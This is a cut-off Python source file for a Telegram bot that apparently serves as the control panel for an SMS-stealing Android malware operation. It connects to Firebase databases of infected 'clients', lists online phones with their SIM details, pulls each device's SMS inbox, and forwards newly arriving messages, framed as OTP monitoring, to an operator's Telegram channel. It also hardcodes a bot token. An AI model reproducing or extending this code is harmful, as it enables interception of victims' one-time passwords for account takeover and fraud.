import sys
if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass
if hasattr(sys.stderr, 'reconfigure'):
    try:
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

import types as _types_mod
if 'urllib3.contrib.appengine' not in sys.modules:
    try:
        import urllib3.contrib.appengine
    except Exception:
        _ae_mod = _types_mod.ModuleType('urllib3.contrib.appengine')
        _ae_mod.is_appengine_sandbox = lambda: False
        sys.modules['urllib3.contrib.appengine'] = _ae_mod

import telebot
from telebot import types
import pyrebase
import json
import html
import time
import re
import os
import threading
from datetime import datetime, timedelta
import pickle
import random
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

BOT_TOKEN = "8958818104:AAGCQC3_Umkq7pnojSJ_9-oE6kcjv31ddk0"
ADMIN_ID = 7627839770
CHANNEL_LINK = "https://t.me/+AjBDnc_GNnU2MjI1"
CHANNEL_ID = -1004245343093
FIREBASE_DATA_CHANNEL = -1004299285123

DATA_FILE = "bot_data.pkl"
VERSION_FILE = "bot_version.txt"

BOT_VERSION = "1.0.0"
LAST_UPDATE_TIME = datetime.now().strftime('%d/%m/%Y %I:%M:%S %p')

USE_CUSTOM_EMOJIS = True
USE_CUSTOM_EMOJIS_IN_TEXT = True

CUSTOM_EMOJIS = {
    "✨": "5931621672846103580",
    "⚡": "5843553939672274145",
    "⚡️": "5843553939672274145",
    "💎": "5807465992363710697",
    "🔥": "5404674261681232568",
    "⭐️": "5958376256788502078",
    "⭐": "5958376256788502078",
    "🌟": "5958376256788502078",
    "💫": "5931621672846103580",
    "🔹": "5931621672846103580",
    "💡": "5931621672846103580",

    "✅": "5776375003280838798",
    "✅️": "5843908536467198016",
    "✔️": "5825794181183836432",
    "✔": "5825794181183836432",
    "❌": "5778527486270770928",
    "⚠️": "5881702736843511327",
    "⚠": "5881702736843511327",
    "🛑": "5872829476143894491",
    "🚫": "5872829476143894491",
    "❗️": "5879813604068298387",
    "❗": "5879813604068298387",
    "ℹ️": "5879785854284599288",
    "ℹ": "5879785854284599288",
    "🟢": "5776375003280838798",
    "🔴": "5778527486270770928",

    "📱": "5877318502947229960",
    "📲": "5877318502947229960",
    "📞": "5877318502947229960",
    "📶": "5874986954180791957",
    "📡": "5874986954180791957",
    "🛜": "5967432491684860012",
    "🔋": "5778546461436284629",
    "💻": "5877318502947229960",
    "🪩": "5807465992363710697",
    "🎰": "5874986954180791957",

    "🔄": "5839200986022812209",
    "🔁": "6005843436479975944",
    "🔒": "5832546462478635761",
    "🔓": "6034962180875490251",
    "🔑": "6005570495603282482",
    "🚪": "5877341274863832725",
    "⚙️": "5877260593903177342",
    "⚙": "5877260593903177342",
    "🔍": "5874960879434338403",
    "🔎": "5874960879434338403",
    "🗑": "5879896690210639947",
    "🔗": "5877465816030515018",
    "➡️": "5877468380125990242",
    "➡": "5877468380125990242",
    "→": "5877468380125990242",

    "💬": "5886666250158870040",
    "📨": "5886666250158870040",
    "💌": "5886666250158870040",
    "📢": "5875465628285931233",
    "🔔": "5875465628285931233",
    "📝": "5886330010054168711",
    "📋": "5877597667231534929",
    "🗒": "5877597667231534929",
    "📁": "5875206779196935950",
    "📂": "6017174676898321263",
    "📄": "5839323457015256759",
    "📊": "5877485980901971030",
    "📌": "5908961403917570106",
    "🆔": "5908961403917570106",
    "🏷": "5854776233950188167",
    "📎": "5877495434124988415",

    "🕐": "5776213190387961618",
    "⏳": "5877613700344450910",
    "⏰": "5985616167740379273",
    "⏱": "5877613700344450910",
    "⏲": "5877613700344450910",
    "⏲️": "5960751816084820359",
    "⏸": "5872829476143894491",

    "💓": "5992453811510186287",
    "❤️": "5992453811510186287",
    "❤": "5899833370052923106",
    "🩵": "5992453811510186287",
    "💔": "5992453811510186287",
    "💞": "5992453811510186287",
    "🩸": "5404674261681232568",
    "👍": "5368324170671202286",
    "👋": "5368324170671202286",
    "🎁": "6032937473162614352",
    "💰": "5807465992363710697",
    "👤": "5771887475421090729",
    "👥": "5771887475421090729",
    "☠": "5872829476143894491",
    "☠️": "5872829476143894491",
    "☢": "5843553939672274145",
    "☢️": "5843553939672274145",
    "1️⃣": "5798769667136819756",
    "2️⃣": "5960582701747539918",
    "3️⃣": "5798927915206840847",
    "4️⃣": "5900108617327054997",
    "5️⃣": "5960961389014028206",
    "6️⃣": "5900120651825418289"
}
_EMOJI_PATTERN = re.compile(
    r'(<tg-emoji[^>]*>.*?</tg-emoji>)|(' +
    '|'.join(map(re.escape, sorted(CUSTOM_EMOJIS.keys(), key=len, reverse=True))) +
    ')'
)

def apply_custom_emojis(text: str) -> str:
    if not text or not USE_CUSTOM_EMOJIS:
        return text
    def repl(m):
        if m.group(1):
            return m.group(1)
        emoji = m.group(2)
        eid = CUSTOM_EMOJIS.get(emoji)
        if eid:
            return f'<tg-emoji emoji-id="{eid}">{emoji}</tg-emoji>'
        return emoji
    return _EMOJI_PATTERN.sub(repl, text)

def strip_custom_emojis(text: str) -> str:
    if not text:
        return text
    return re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', text)

def build_inline_button(text, callback_data=None, url=None, style=None, icon_custom_emoji_id=None):
    kwargs = {}
    if callback_data is not None:
        kwargs['callback_data'] = callback_data
    if url is not None:
        kwargs['url'] = url
    if style is not None:
        kwargs['style'] = style
    if icon_custom_emoji_id is not None:
        kwargs['icon_custom_emoji_id'] = str(icon_custom_emoji_id)

    try:
        return types.InlineKeyboardButton(text, **kwargs)
    except TypeError:
        kwargs.pop('style', None)
        kwargs.pop('icon_custom_emoji_id', None)
        btn = types.InlineKeyboardButton(text, **kwargs)
        if style:
            setattr(btn, 'style', style)
        if icon_custom_emoji_id:
            setattr(btn, 'icon_custom_emoji_id', str(icon_custom_emoji_id))
        return btn

def strip_markup_icons_only(markup):
    if not markup or not hasattr(markup, 'keyboard'):
        return markup
    try:
        new_markup = types.InlineKeyboardMarkup(row_width=getattr(markup, 'row_width', 2))
        for row in markup.keyboard:
            new_row = []
            for btn in row:
                b_kwargs = {'text': btn.text}
                if getattr(btn, 'callback_data', None) is not None:
                    b_kwargs['callback_data'] = btn.callback_data
                if getattr(btn, 'url', None) is not None:
                    b_kwargs['url'] = btn.url
                if getattr(btn, 'web_app', None) is not None:
                    b_kwargs['web_app'] = btn.web_app
                if getattr(btn, 'style', None) is not None:
                    b_kwargs['style'] = btn.style
                new_row.append(types.InlineKeyboardButton(**b_kwargs))
            new_markup.row(*new_row)
        return new_markup
    except Exception:
        return markup

def strip_markup_all_94(markup):
    if not markup or not hasattr(markup, 'keyboard'):
        return markup
    try:
        new_markup = types.InlineKeyboardMarkup(row_width=getattr(markup, 'row_width', 2))
        for row in markup.keyboard:
            new_row = []
            for btn in row:
                b_kwargs = {'text': btn.text}
                if getattr(btn, 'callback_data', None) is not None:
                    b_kwargs['callback_data'] = btn.callback_data
                if getattr(btn, 'url', None) is not None:
                    b_kwargs['url'] = btn.url
                if getattr(btn, 'web_app', None) is not None:
                    b_kwargs['web_app'] = btn.web_app
                new_row.append(types.InlineKeyboardButton(**b_kwargs))
            new_markup.row(*new_row)
        return new_markup
    except Exception:
        return markup

def remove_reply_keyboard(chat_id):
    try:
        tmp = bot.send_message(chat_id, "⏳", reply_markup=types.ReplyKeyboardRemove())
        bot.delete_message(chat_id, tmp.message_id)
    except Exception:
        pass

user_locked_messages = {}
user_display_names = {}

def get_user_name(chat_id):
    if chat_id in user_display_names:
        return user_display_names[chat_id]
    try:
        c = bot.get_chat(chat_id)
        fn = getattr(c, 'first_name', '') or ''
        ln = getattr(c, 'last_name', '') or ''
        n = html.escape(f"{fn} {ln}".strip())
        if n:
            user_display_names[chat_id] = n
            return n
    except Exception:
        pass
    return "User"

def get_bot_version():
    try:
        if os.path.exists(VERSION_FILE):
            with open(VERSION_FILE, 'r') as f:
                return f.read().strip()
        return BOT_VERSION
    except:
        return BOT_VERSION

def save_bot_version():
    try:
        with open(VERSION_FILE, 'w') as f:
            f.write(BOT_VERSION)
        logger.info(f"✅ Bot version saved: {BOT_VERSION}")
    except Exception as e:
        logger.error(f"❌ Error saving version: {e}")

def check_user_version(user_id):
    try:
        user_version_file = f"user_version_{user_id}.txt"
        if os.path.exists(user_version_file):
            with open(user_version_file, 'r') as f:
                saved_version = f.read().strip()
                return saved_version == BOT_VERSION
        return False
    except:
        return False

def update_user_version(user_id):
    try:
        user_version_file = f"user_version_{user_id}.txt"
        with open(user_version_file, 'w') as f:
            f.write(BOT_VERSION)
        return True
    except:
        return False

def get_update_message():
    return f"""
╔──────────────────────────────╗
    UPDATED SUCCESSFULLY
╚──────────────────────────────╝

📌 <b>New Version:</b> <code>{BOT_VERSION}</code>
🕐 <b>Update Time:</b> {LAST_UPDATE_TIME}

──────────────────────────────

⚠️ <b>IMPORTANT NOTICE</b> ⚠️

Bot has been updated/restarted!
Please click <b>/start</b> to continue using the bot.

──────────────────────────────

❌ <b>Old commands will not work</b>
✅ <b>Click /start to activate</b>

──────────────────────────────

💡 <i>Your previous data is safe and saved</i>
"""

telebot.apihelper.RETRY_ON_ERROR = True
telebot.apihelper.CONNECT_TIMEOUT = 15
telebot.apihelper.READ_TIMEOUT = 60
bot = telebot.TeleBot(BOT_TOKEN, threaded=True)

user_states = {}
user_firebase = {}
user_firebase_count = {}
user_connected_device = {}
user_selected_sim = {}
user_channel_data = {}
user_otp_channel = {}
user_last_activity = {}
user_chat_messages = {}
user_balance = {}
user_notify_off = {}
user_all_ids = set()
user_last_hello_message = {}
bot_mode = True
user_subscription = {}
admin_subscription_states = {}
user_forward_number = {}
device_forward_numbers = {}
user_forward_states = {}

user_token_channel = {}
user_token_active = {}

otp_monitoring = {}
user_last_message_keys = {}

def save_data():
    try:
        data = {
            'user_firebase': user_firebase,
            'user_firebase_count': user_firebase_count,
            'user_otp_channel': user_otp_channel,
            'user_balance': user_balance,
            'user_notify_off': user_notify_off,
            'user_all_ids': list(user_all_ids),
            'user_connected_device': user_connected_device,
            'user_selected_sim': user_selected_sim,
            'user_channel_data': user_channel_data,
            'user_last_activity': user_last_activity,
            'bot_mode': bot_mode,
            'user_token_channel': user_token_channel,
            'user_token_active': user_token_active,
            'user_subscription': user_subscription,
            'user_forward_number': user_forward_number,
            'device_forward_numbers': device_forward_numbers,
            'user_locked_messages': {uid: {path: list(keys) for path, keys in paths.items()} for uid, paths in user_locked_messages.items()}
        }
        with open(DATA_FILE, 'wb') as f:
            pickle.dump(data, f)
        logger.info(f"✅ Data saved to {DATA_FILE}")
    except Exception as e:
        logger.error(f"❌ Error saving data: {e}")

def load_data():
    global bot_mode
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'rb') as f:
                data = pickle.load(f)
            
            user_firebase.update(data.get('user_firebase', {}))
            user_firebase_count.update(data.get('user_firebase_count', {}))
            user_otp_channel.update(data.get('user_otp_channel', {}))
            user_balance.update(data.get('user_balance', {}))
            user_notify_off.update(data.get('user_notify_off', {}))
            user_all_ids.update(data.get('user_all_ids', []))
            user_connected_device.update(data.get('user_connected_device', {}))
            user_selected_sim.update(data.get('user_selected_sim', {}))
            user_channel_data.update(data.get('user_channel_data', {}))
            user_last_activity.update(data.get('user_last_activity', {}))
            bot_mode = data.get('bot_mode', True)
            user_token_channel.update(data.get('user_token_channel', {}))
            user_token_active.update(data.get('user_token_active', {}))
            user_subscription.update(data.get('user_subscription', {}))
            user_forward_number.update(data.get('user_forward_number', {}))
            device_forward_numbers.update(data.get('device_forward_numbers', {}))
            
            loaded_locked = data.get('user_locked_messages', {})
            for uid, paths in loaded_locked.items():
                user_locked_messages[uid] = {path: set(keys) for path, keys in paths.items()}
            
            logger.info(f"✅ Data loaded from {DATA_FILE}")
            logger.info(f"📊 Total Users: {len(user_all_ids)}")
            return True
    except Exception as e:
        logger.error(f"❌ Error loading data: {e}")
        return False

def auto_save():
    while True:
        time.sleep(300)
        save_data()

save_thread = threading.Thread(target=auto_save, daemon=True)
save_thread.start()

def auto_hello_checker():
    while True:
        try:
            current_time = datetime.now()
            for user_id in list(user_last_activity.keys()):
                try:
                    last_active = user_last_activity.get(user_id)
                    if last_active:
                        time_diff = current_time - last_active
                        if time_diff.total_seconds() > 900:
                            if user_id in user_last_hello_message:
                                try:
                                    bot.delete_message(user_id, user_last_hello_message[user_id])
                                except:
                                    pass
                                del user_last_hello_message[user_id]
                            

                            user_last_activity[user_id] = current_time
                except:
                    pass
        except:
            pass
        time.sleep(60)

hello_thread = threading.Thread(target=auto_hello_checker, daemon=True)
hello_thread.start()

def check_version_and_notify(user_id, chat_id):
    """Returns True if user can proceed, False if blocked (needs /start)"""
    if user_id == ADMIN_ID:
        return True
    
    if not check_user_version(user_id):
        safe_send_message(chat_id, get_update_message())
        return False
    return True

def update_user_activity(user_id):
    user_last_activity[user_id] = datetime.now()

def safe_send_message(chat_id, text, reply_markup=None, track=True, disable_web_page_preview=True):
    formatted_text = apply_custom_emojis(text) if USE_CUSTOM_EMOJIS else text
    
    try:
        return bot.send_message(chat_id, formatted_text, reply_markup=reply_markup, parse_mode='HTML', disable_web_page_preview=disable_web_page_preview)
    except Exception as e1:
        clean_text = strip_custom_emojis(text)
        try:
            return bot.send_message(chat_id, clean_text, reply_markup=reply_markup, parse_mode='HTML', disable_web_page_preview=disable_web_page_preview)
        except Exception:
            pass

    markup_with_colors = strip_markup_icons_only(reply_markup)
    clean_text = strip_custom_emojis(text)
    try:
        return bot.send_message(chat_id, clean_text, reply_markup=markup_with_colors, parse_mode='HTML', disable_web_page_preview=disable_web_page_preview)
    except Exception as e2:
        logger.debug(f"HTML send with button colors failed: {e2}")

    plain_markup = strip_markup_all_94(reply_markup)
    try:
        return bot.send_message(chat_id, clean_text, reply_markup=plain_markup, parse_mode='HTML', disable_web_page_preview=disable_web_page_preview)
    except Exception:
        pass

    try:
        plain_text = re.sub(r'<[^>]+>', '', clean_text)
        return bot.send_message(chat_id, plain_text, reply_markup=plain_markup, disable_web_page_preview=disable_web_page_preview)
    except Exception as e_plain:
        err_str = str(e_plain)
        if "429" in err_str:
            logger.warning(f"Telegram rate limit: {e_plain}")
        else:
            logger.error(f"Plain text send failed: {e_plain}")
        return None

def check_bot_mode(user_id):
    if user_id == ADMIN_ID:
        return True
    return bot_mode

def check_user_joined(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
        return False
    except:
        return False

def count_clients_in_firebase(db):
    try:
        clients = db.child("clients").get()
        count = 0
        if clients.each():
            for _ in clients.each():
                count += 1
        return count
    except:
        return 0

def is_user_subscribed(user_id):
    try:
        if user_id in user_subscription:
            expiry = datetime.strptime(user_subscription[user_id], '%d/%m/%Y')
            return expiry > datetime.now()
        return False
    except:
        return False

def is_firebase_url_used_by_user(user_id, db_url):
    db_url = db_url.strip().rstrip('/')
    fb_list = user_firebase.get(user_id, {})
    for fb_id, fb_data in fb_list.items():
        if fb_data.get("url", "").strip().rstrip('/') == db_url:
            return True
    return False

def connect_firebase(db_url):
    try:
        db_url = db_url.strip()
        if not db_url.startswith("https://"):
            return None, None, 0
        
        config = {
            "apiKey": "AIzaSyDummyKeyForRealTimeDB",
            "authDomain": "test.firebaseapp.com",
            "databaseURL": db_url,
            "storageBucket": "test.appspot.com"
        }
        
        firebase = pyrebase.initialize_app(config)
        db = firebase.database()
        db.child("/").get()
        client_count = count_clients_in_firebase(db)
        return firebase, db, client_count
    except Exception as e:
        logger.error(f"Firebase connection error: {e}")
        return None, None, 0

def get_online_clients(db):
    try:
        clients = db.child("clients").get()
        online_clients = []
        if clients.each():
            for client in clients.each():
                client_data = client.val()
                if client_data and client_data.get("status") == True:
                    online_clients.append({
                        "id": client.key(),
                        "data": client_data
                    })
        return online_clients
    except:
        return []

def get_client_by_id(db, client_id):
    try:
        client = db.child("clients").child(client_id).get()
        return client.val()
    except:
        return None

def is_client_online(db, client_id):
    try:
        client = db.child("clients").child(client_id).get()
        client_data = client.val()
        if client_data and client_data.get("status") == True:
            return True
        return False
    except:
        return False

def extract_sims(client_data):
    if not client_data or not isinstance(client_data, dict):
        return [
            {'carrierName': 'SIM 1 (Active)', 'phoneNumber': '', 'simSlotIndex': 0},
            {'carrierName': 'SIM 2 (Active)', 'phoneNumber': '', 'simSlotIndex': 1}
        ]
    raw_sims = None
    for k, v in client_data.items():
        if str(k).lower() in ('sims', 'sim', 'siminfo', 'sim_info', 'simlist', 'sim_list', 'simcards', 'sim_cards', 'simdetails', 'simdata', 'sim_data', 'simcardinfo'):
            raw_sims = v
            break
    if isinstance(raw_sims, str):
        try:
            import json
            raw_sims = json.loads(raw_sims)
        except Exception:
            pass
    extracted = []
    if isinstance(raw_sims, dict):
        if any(k in raw_sims for k in ('carrierName', 'carrier', 'operator', 'phoneNumber', 'mobNo', 'displayName')):
            extracted = [raw_sims]
        else:
            sorted_keys = sorted(raw_sims.keys(), key=lambda k: int(''.join(filter(str.isdigit, str(k)))) if any(c.isdigit() for c in str(k)) else str(k))
            extracted = [raw_sims[k] for k in sorted_keys if isinstance(raw_sims[k], dict)]
    elif isinstance(raw_sims, (list, tuple)):
        extracted = [s for s in raw_sims if s]
    if not extracted:
        for p in [('sim1', 'sim2'), ('sim_1', 'sim_2'), ('slot0', 'slot1'), ('simSlot0', 'simSlot1'), ('sim_slot_0', 'sim_slot_1')]:
            s0 = client_data.get(p[0])
            s1 = client_data.get(p[1])
            if s0 or s1:
                if s0:
                    extracted.append(s0 if isinstance(s0, dict) else {'carrierName': str(s0), 'simSlotIndex': 0})
                if s1:
                    extracted.append(s1 if isinstance(s1, dict) else {'carrierName': str(s1), 'simSlotIndex': 1})
                break
    carrier = (
        client_data.get('carrierName') or
        client_data.get('carrier') or
        client_data.get('operator') or
        client_data.get('networkOperatorName') or
        client_data.get('service_provider') or
        client_data.get('simOperator') or
        client_data.get('simOperatorName')
    )
    mob = (
        client_data.get('mobNo') or
        client_data.get('phoneNumber') or
        client_data.get('phone') or
        client_data.get('number')
    )
    if not extracted:
        extracted = [
            {'carrierName': carrier or 'Active SIM', 'phoneNumber': mob or '', 'simSlotIndex': 0},
            {'carrierName': carrier or 'Active SIM', 'phoneNumber': '', 'simSlotIndex': 1}
        ]
    elif len(extracted) == 1:
        s0_carrier = extracted[0].get('carrierName') if isinstance(extracted[0], dict) else carrier
        extracted.append({
            'carrierName': s0_carrier or 'Active SIM',
            'phoneNumber': '',
            'simSlotIndex': 1
        })
    norm = []
    for idx, s in enumerate(extracted):
        if not isinstance(s, dict):
            s = {'carrierName': str(s)}
        c = (
            s.get('carrierName') or
            s.get('carrier') or
            s.get('operator') or
            s.get('networkOperatorName') or
            s.get('simOperatorName') or
            s.get('displayName') or
            s.get('simName') or
            s.get('subscriptionName') or
            carrier or
            'Active SIM'
        )
        p = (
            s.get('phoneNumber') or
            s.get('phone') or
            s.get('mobNo') or
            s.get('number') or
            (mob if idx == 0 else '') or
            ''
        )
        slot = s.get('simSlotIndex')
        if slot is None:
            slot = s.get('slot') or s.get('slotIndex') or s.get('simSlot') or idx
        try:
            slot = int(slot)
        except Exception:
            slot = idx
        norm.append({
            'carrierName': str(c).strip(),
            'phoneNumber': str(p).strip(),
            'simSlotIndex': slot
        })
    slots = [s['simSlotIndex'] for s in norm]
    if slots and min(slots) >= 1 and max(slots) <= 2:
        for s in norm:
            s['simSlotIndex'] = s['simSlotIndex'] - 1
    return norm

def get_sim_for_slot(sims, slot_index):
    if not sims:
        return None
    for s in sims:
        if s.get('simSlotIndex') == slot_index:
            return s
    if slot_index < len(sims):
        s = sims[slot_index]
        if s.get('simSlotIndex') == slot_index or s.get('simSlotIndex') is None:
            return s
    if len(sims) == 1 and slot_index == 0:
        return sims[0]
    return None


def join_channel(channel_input, message=None):
    try:
        if message and getattr(message, 'forward_from_chat', None):
            f = message.forward_from_chat
            try:
                chat = bot.get_chat(f.id)
                return chat.id, chat.title or "Connected Chat"
            except Exception:
                return f.id, getattr(f, 'title', None) or "Connected Chat"
                
        if not channel_input:
            return None, None
            
        raw = str(channel_input).strip()
        
        if CHANNEL_LINK and (raw == CHANNEL_LINK.strip() or raw.rstrip('/') == CHANNEL_LINK.rstrip('/')):
            try:
                chat = bot.get_chat(CHANNEL_ID)
                return chat.id, chat.title or "Connected Channel"
            except Exception:
                return CHANNEL_ID, "Connected Channel"
        
        c_match = re.search(r't\.me/c/(\d+)', raw)
        if c_match:
            target_id = int(f"-100{c_match.group(1)}")
            try:
                chat = bot.get_chat(target_id)
                return chat.id, chat.title or "Connected Chat"
            except Exception:
                return target_id, "Connected Chat"
                
        if re.match(r'^-100\d+$', raw):
            chat = bot.get_chat(int(raw))
            return chat.id, chat.title or "Connected Chat"
        elif re.match(r'^-\d+$', raw):
            try:
                chat = bot.get_chat(int(raw))
                return chat.id, chat.title or "Connected Chat"
            except Exception:
                chat = bot.get_chat(int(f"-100{raw[1:]}"))
                return chat.id, chat.title or "Connected Chat"
        elif re.match(r'^\d+$', raw):
            target_id = int(f"-{raw}") if raw.startswith("100") else int(f"-100{raw}")
            try:
                chat = bot.get_chat(target_id)
                return chat.id, chat.title or "Connected Chat"
            except Exception:
                chat = bot.get_chat(int(raw))
                return chat.id, chat.title or "Connected Chat"
                
        if "t.me/" in raw and not "+" in raw and not "joinchat" in raw:
            username = raw.split("t.me/")[-1].split("/")[0].split("?")[0].strip()
            chat = bot.get_chat(f"@{username}")
            return chat.id, chat.title or "Connected Chat"
            
        if raw.startswith("@"):
            chat = bot.get_chat(raw)
            return chat.id, chat.title or "Connected Chat"
            
        chat = bot.get_chat(raw)
        return chat.id, chat.title or "Connected Chat"
    except Exception as e:
        logger.error(f"Join channel/group error: {e}")
        return None, None

def extract_sms_details(msg_text):
    to_number = None
    sms_message = None
    msg_text = msg_text.strip()
    
    to_patterns = [
        r'(?:To|to)\s*(?:\(Tap to copy\))?\s*:\s*([+\d\s-]+)',
        r'(?:📞\s*)?To\s*:\s*([+\d\s-]+)',
        r'(?:Number|Phone|Target)\s*:\s*([+\d\s-]+)',
        r'\+?\d{10,15}',
    ]
    
    for pattern in to_patterns:
        match = re.search(pattern, msg_text)
        if match:
            to_number = match.group(1) if match.lastindex else match.group(0)
            to_number = re.sub(r'[\s-]', '', to_number)
            if len(to_number) == 10:
                to_number = '+91' + to_number
            elif len(to_number) > 10 and not to_number.startswith('+'):
                to_number = '+' + to_number
            break
    
    msg_patterns = [
        r'(?:Massage|massage)\s*(?:\(Tap to copy\))?\s*:\s*(.+?)(?:\n|$)',
        r'(?:Message|message)\s*(?:\(Tap to copy\))?\s*:\s*(.+?)(?:\n|$)',
        r'(?:Body|body)\s*(?:\(Tap to copy\))?\s*:\s*(.+?)(?:\n|$)',
        r'(?:MSG|SMS|Text|Content)\s*:\s*(.+?)(?:\n|$)',
        r'(?:💬\s*)?(?:Message|MSG)\s*:\s*(.+?)(?:\n📋|\n━━|$)',
        r'📋\s*One-tap copy\s*:\s*\n?(.+)',
        r'📋\s*Copy\s*:\s*\n?(.+)',
    ]
    
    for pattern in msg_patterns:
        match = re.search(pattern, msg_text, re.DOTALL | re.IGNORECASE)
        if match:
            sms_message = match.group(1).strip()
            sms_message = sms_message.split('\n')[0].strip()
            break
    
    if not sms_message and to_number:
        lines = msg_text.split('\n')
        for i, line in enumerate(lines):
            if to_number in line.replace(' ', '').replace('-', ''):
                for j in range(i+1, min(i+3, len(lines))):
                    clean_line = lines[j].strip()
                    if clean_line and not clean_line.startswith(('To', '📞', '📱', '👤', '📋', '━━')):
                        sms_message = clean_line
                        break
                break
    
    return to_number, sms_message

def parse_sms_record(item, default_key=""):
    if not item:
        return None
    if isinstance(item, str):
        try:
            import json
            parsed = json.loads(item)
            if isinstance(parsed, dict):
                item = parsed
            else:
                item = {"body": str(item)}
        except Exception:
            item = {"body": str(item)}
            
    if not isinstance(item, dict):
        return None
        
    action_type = str(item.get("action", "")).lower()
    cmd_type = str(item.get("command", "")).lower()
    msg_type = str(item.get("type", "")).lower()
    if action_type == "send_sms" or cmd_type == "sendsms" or msg_type == "outgoing":
        return None
        
    sms_from = (
        item.get("sender") or
        item.get("address") or
        item.get("originatingAddress") or
        item.get("from") or
        item.get("phoneNumber") or
        item.get("phone") or
        item.get("number") or
        item.get("senderNumber") or
        item.get("title") or
        "Unknown"
    )
    sms_body = (
        item.get("message") or
        item.get("body") or
        item.get("msg") or
        item.get("text") or
        item.get("sms") or
        item.get("smsBody") or
        item.get("content") or
        item.get("displayMessageBody") or
        item.get("description") or
        ""
    )
    
    raw_time = item.get("dateTime") or item.get("time") or item.get("timestamp") or item.get("date") or ""
    sms_time_str = ""
    msg_id = item.get("id") or 0
    
    if isinstance(raw_time, (int, float)):
        try:
            ts = raw_time / 1000 if raw_time > 1e11 else raw_time
            sms_time_str = datetime.fromtimestamp(ts).strftime("%d/%m/%Y %I:%M:%S %p")
            if not msg_id:
                msg_id = int(raw_time if raw_time > 1e11 else raw_time * 1000)
        except Exception:
            sms_time_str = str(raw_time)
    elif isinstance(raw_time, str) and raw_time.strip():
        sms_time_str = raw_time.strip()
    else:
        sms_time_str = datetime.now().strftime("%d/%m/%Y %I:%M:%S %p")
        
    sms_from = str(sms_from).strip()
    sms_body = str(sms_body).strip()
    
    if not sms_body and sms_from == "Unknown":
        return None
        
    stable_key = str(msg_id) if msg_id else f"{default_key}_{sms_from}_{hash(sms_body)}"
    fp = f"{stable_key}_{sms_from}_{hash(sms_body)}"
    
    return {
        "id": msg_id,
        "from": sms_from,
        "body": sms_body,
        "time": sms_time_str,
        "fingerprint": fp,
        "raw": item
    }

def collect_client_messages(db, client_id):
    messages = []
    try:
        r_snap = db.child("messages").child(client_id).get()
        r_val = r_snap.val() if r_snap else None
        if isinstance(r_val, dict):
            for mk in sorted(r_val.keys()):
                mv = r_val[mk]
                r = parse_sms_record(mv, default_key=f"msg_{client_id}_{mk}")
                if r:
                    if not r.get("id"):
                        try:
                            if str(mk).isdigit() and int(mk) > 1e11:
                                r["id"] = int(mk)
                        except Exception:
                            pass
                    messages.append(r)
        elif isinstance(r_val, list):
            for idx, item in enumerate(r_val):
                r = parse_sms_record(item, default_key=f"msg_{client_id}_{idx}")
                if r:
                    messages.append(r)
    except Exception:
        pass
        
    try:
        c_snap = db.child("clients").child(client_id).get()
        c_val = c_snap.val() if c_snap else None
    except Exception:
        c_val = None
        
    if isinstance(c_val, dict):
        sms_keys = ['smsList', 'sms_list', 'receivedMessages', 'receivedSms', 'inbox']
        for sk in sms_keys:
            sub = c_val.get(sk)
            if not sub:
                continue
            if isinstance(sub, str):
                try:
                    import json
                    sub = json.loads(sub)
                except Exception:
                    pass
            if isinstance(sub, dict):
                for mk, mv in sub.items():
                    r = parse_sms_record(mv, default_key=f"clients_{client_id}_{sk}_{mk}")
                    if r:
                        messages.append(r)
            elif isinstance(sub, list):
                for idx, item in enumerate(sub):
                    r = parse_sms_record(item, default_key=f"clients_{client_id}_{sk}_{idx}")
                    if r:
                        messages.append(r)
                        
    return messages

def find_message_paths_in_db(db, client_id):
    return [f"messages/{client_id}"]

def lock_existing_messages(user_id, client_id, db):
    try:
        if user_id not in user_locked_messages:
            user_locked_messages[user_id] = {}
        if client_id not in user_locked_messages[user_id]:
            user_locked_messages[user_id][client_id] = set()
            
        current_msgs = collect_client_messages(db, client_id)
        for msg in current_msgs:
            if msg.get("id"):
                user_locked_messages[user_id][client_id].add(str(msg["id"]))
            user_locked_messages[user_id][client_id].add(msg["fingerprint"])
            
        logger.info(f"Locked {len(current_msgs)} existing messages for user {user_id}, device {client_id[:12]}...")
        return True
    except Exception as e:
        logger.error(f"Error locking messages: {e}")
        return False

def is_message_locked(user_id, client_id, fp):
    try:
        if user_id not in user_locked_messages:
            return False
        if client_id not in user_locked_messages[user_id]:
            return False
        return fp in user_locked_messages[user_id][client_id]
    except Exception:
        return False

def lock_message(user_id, client_id, fp):
    try:
        if user_id not in user_locked_messages:
            user_locked_messages[user_id] = {}
        if client_id not in user_locked_messages[user_id]:
            user_locked_messages[user_id][client_id] = set()
        user_locked_messages[user_id][client_id].add(fp)
        return True
    except Exception:
        return False

def start_otp_monitoring_for_user(user_id, client_id, db, chat_id=None):
    lock_existing_messages(user_id, client_id, db)
    otp_channel_id = user_otp_channel.get(user_id, {}).get("otp_channel_id")
    otp_monitoring[user_id] = {
        "client_id": client_id,
        "otp_channel_id": otp_channel_id,
        "connect_time": int(time.time() * 1000)
    }
    if chat_id and otp_channel_id:
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(build_inline_button("See Messages", callback_data=f"seemgs_{client_id}", style="primary", icon_custom_emoji_id=CUSTOM_EMOJIS.get("💬")))
        safe_send_message(chat_id, f"""Connection Message Reading ✅

ɴᴏᴡ ᴄʜᴀᴋ ᴜᴘᴄᴏᴍɪɴɢ ᴄᴏɴɴᴇᴄᴛɪᴏɴ
ᴍᴀꜱꜱᴀɢᴇ ɪɴ ᴏᴛᴘ ᴄʜᴀɴɴᴇʟ""", reply_markup=keyboard)
    logger.info(f"OTP Monitoring started for user {user_id}, device {client_id[:12]}...")

def forward_sms_to_otp(user_id, otp_info, sms_data, db=None, client_id=None):
    try:
        sms_from = sms_data.get("from", "Unknown")
        sms_body = sms_data.get("body", "")
        sms_time = sms_data.get("time") or datetime.now().strftime("%d/%m/%Y %I:%M:%S %p")
        
        if not sms_body and sms_from == "Unknown":
            return
            
        otp_channel_id = otp_info.get("otp_channel_id") if isinstance(otp_info, dict) else None
        if not otp_channel_id and user_id in user_otp_channel:
            otp_channel_id = user_otp_channel[user_id].get("otp_channel_id")
            
